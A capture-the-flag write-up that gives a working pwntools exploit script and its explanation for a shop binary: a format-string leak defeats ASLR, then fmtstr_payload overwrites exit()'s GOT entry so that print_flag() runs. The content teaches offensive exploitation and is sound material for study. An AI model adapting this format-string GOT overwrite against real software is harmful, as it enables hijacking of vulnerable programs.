# GOT OVERWRITE--CALL ANOTHER FUNCTION

Fetch the memory address for the exit function and replace it by the memory address of the function you want to call. 

Using `pwntools` from python lib.

### Script:

```python
#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./shop")
context.binary = exe

# io = gdb.debug(exe.path, '')
io = process('ncat --ssl the-ingredient-shop-134ad2f55ba78e9f.challs.brunnerne.xyz 443'.split())
io.sendlineafter(b'exit\n', b'%43$p')
io.recvuntil(b'here is your choice\n')
exe.address = int(io.recvline().strip(), 16)-0x1351
print(hex(exe.got.exit), hex(exe.sym.print_flag))

payload = fmtstr_payload(8, writes={
    exe.got.exit : p64(exe.sym.print_flag)
})

io.sendlineafter(b'exit\n', payload)
io.sendlineafter(b'exit\n', b'3')

io.interactive()
```

# GOT Overwrite Exploit Script — Summary

**Goal:** Make the binary call `print_flag()` instead of `exit()` to retrieve the flag.

**Steps in the Script:**

1. **Setup**
    - Load the binary using `pwntools` to access symbols (`exit`, `print_flag`).
    - Set connection details to the remote server.
2. **Leak a memory address**
    - Use a **format string** (`%43$p`) to print a pointer from the stack.
    - Calculate the **base address** of the binary to bypass ASLR.
3. **Identify addresses**
    - Find:
        - GOT entry for `exit()` → where the binary looks up `exit` at runtime.
        - Address of `print_flag()` → where we want execution to jump.
4. **Build payload**
    - Use `fmtstr_payload()` to **overwrite `exit()`’s GOT entry** with `print_flag()`’s address.
    - Stack position (`8`) ensures the payload writes to the correct memory location.
5. **Send payload and trigger**
    - Send the format string payload to overwrite the GOT.
    - Choose the menu option that calls `exit()`.
    - Program jumps to `print_flag()` instead → prints the flag.
6. **Interactive mode**
    - Keep the connection open to see the output and capture the flag.

**Key Concepts Used:**

- GOT (Global Offset Table) overwrite
- Format string exploitation
- ASLR bypass via leaked pointer
- Function redirection

---

**In short:**

> Leak a pointer → calculate binary base → overwrite exit() in GOT with print_flag() → trigger exit → get flag.
